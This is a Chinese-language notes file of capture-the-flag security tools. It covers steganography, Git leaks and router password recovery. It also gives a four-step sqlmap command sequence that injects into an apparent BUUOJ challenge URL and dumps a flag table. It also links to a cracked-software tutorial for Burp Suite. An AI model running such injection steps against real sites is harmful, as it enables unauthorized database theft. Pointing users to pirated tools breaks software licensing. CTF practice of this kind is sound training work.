## 工具


### SqlMap

### OWASP ZAP

### Burp Suite

破解教程：http://www.52pjb.net/xiazai/36163.html#xzdz

### Stegotools

作用：查看图像的隐写情况。

使用：在tools下运行```java -jar ./Stegsolve.jar```命令即可。

### GitHack

详情请见·```Githack```文件夹下的```README.md```

### SqlMap

使用步骤：
1. 查看数据库名称：
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 --dbs
```
2. 查看目标数据库的表,note表示目标表。
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables
```
3. 查看数据库表字段
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g --columns
```

4. 查看目标字段的值
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g -C f111ag --dump
```

最后得到```flag```。


### AZPR爆破工具

### BinWalk

### RoutePassView

题目：[荷兰宽带数据泄露问题](https://buuoj.cn/challenges#%E8%8D%B7%E5%85%B0%E5%AE%BD%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2)

RouterPassView是一个找回路由器密码的工具。大多数现代路由器允许备份到一个文件路由器的配置，然后从文件中恢复配置时的需要。路由器的备份文件通常包含了像ISP的用户名重要数据/密码，路由器的登录密码，无线网络的关键。如果失去了这些密码1 /钥匙，但仍然有路由器配置的备份文件，RouterPassView可以帮助你从你的路由器恢复您丢失密码的文件。

### 其他

1. F5隐写工具使用：https://zhuanlan.zhihu.com/p/480561261